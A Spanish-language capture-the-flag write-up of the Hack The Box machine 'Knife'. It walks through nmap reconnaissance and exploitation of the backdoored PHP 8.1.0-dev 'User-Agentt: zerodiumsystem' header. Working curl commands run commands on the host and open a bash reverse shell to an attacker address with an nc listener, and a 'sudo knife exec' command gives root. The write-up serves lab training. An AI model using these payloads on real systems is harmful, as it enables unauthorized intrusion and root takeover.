---
title: Knife - HTB Writeup
date: 2023-09-08 03:20:00 +0800
categories: [Writeups, HTB]
tags: [Easy, Linux, Writeup]
image:
  path: /assets/img/post/knife/jimmy-chang-Q67YYjgXBfY-unsplash.jpg
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
---

**Knife** es una máquina de dificultad ```Easy``` en la plataforma **Hack The Box**

En esta máquina explotaremos una **vulnerabilidad** de la versión ```8.1.8-dev``` de ```PHP```

## **Reconocimiento**

Realizaremos un escaneo con ```nmap``` para descunrir puertos abiertos en la máquina

```bash
nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.10.242 -oG allPorts
```

![img](/assets/img/post/knife/d39b61c6-b6af-410d-ac30-6014585c55d5.png)

Vemos que están abiertos el puerto ```22``` y el ```80```

Vamos a realizar un escaneo de servicios y versiones sobre estos puertos:

```bash
nmap -sCV -p22,80 10.10.10.242 -oN versions
```

![img](/assets/img/post/knife/ba998012-681a-4d58-9014-5f242f7f0ec6.png)

Podemos ver que por el puerto ```22``` corre un servicio ```SSH``` y por el ```80``` un ```HTTP```

Con ```curl``` haremos una petición en la web a ver que nos devuelve:

```bash
curl -i 10.10.10.242
```

![img](/assets/img/post/knife/5ede2a37-310b-4750-856d-78e1fb163cbe.png)

## **Explotación**

Como podemos ver en la cabecera del ```output``` que nos devuelve el ```curl```, la web es lanzada por un servicio ```PHP/8.1.0-dev```

Si buscamos información sobre esta **versión** de ```PHP```, podemos ver que esta es vulnerable a un ```RCE``` *(Remote Command Execution)* utilizando la cabecera:

```bash
User-Agentt: zerodiumsystem(‘command’);
```

Podemos realizar una prueba para ver si el ```RCE``` da resultados:

```bash
curl -X GET "http://10.10.10.242/" -H "User-Agentt: zerodiumsystem('bash -c \"id\"');"
uid=1000(james) gid=1000(james) groups=1000(james)
```

Como podemos ver el ```RCE``` funciona, así que vamos a conseguir una ```reverse shell```:

```bash
curl -X GET "http://10.10.10.242/" -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/10.10.14.8/443 0>&1\"');"
```

En otra consola nos pondremos en escucha con ```nc``` por el puerto que hayamos indicado:

```bash
nc -lvnp 443
```

Y ya tendriamos acceso al sistema:

![img](/assets/img/post/knife/1e64cb21-0ac4-46e6-8a25-3190cb332811.png)

## **Escalada de Privilegios**

Para realizar la escalada ejecutaremos: 

```bash
sudo -l
```

para ver los ```binarios``` que podemos ejecutar como ```root```, los cuales en este caso son los siguientes:

![img](/assets/img/post/knife/f1d1188d-4b91-416c-a6b0-33458b263970.png)

Si ejecutamos ```/usr/bin/knife``` podemos ver que hace:

```bash
james@knife:/$ /usr/bin/knife -h                        
knife exec [SCRIPT] (options)
```

Usaremos esto para conseguir una consola como root, para ello ejecutaremos el siguiente comando:

```bash
james@knife:/$ sudo knife exec -E 'exec "/bin/sh"'
id
uid=0(root) gid=0(root) groups=0(root)
```

Y ya tendremos acceso como root a la máquina

Espero que haya ayudado, se agradece cualquier tipo de comentario para mejorar poco a poco. Adios!